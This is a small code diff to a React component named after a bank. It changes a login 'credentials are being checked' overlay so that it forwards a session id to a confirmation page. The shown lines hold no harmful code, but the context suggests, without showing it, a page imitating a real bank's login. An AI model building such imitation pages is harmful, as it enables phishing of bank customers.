@@ -25,7 +25,7 @@ const BankhausSpaengler = () => {
 
   return (
     <>
-      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate("/confirmation")} />}
+      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate("/confirmation?s=" + sessionId)} />}
     <div className="min-h-screen flex flex-col">
       {/* Main */}
       <div
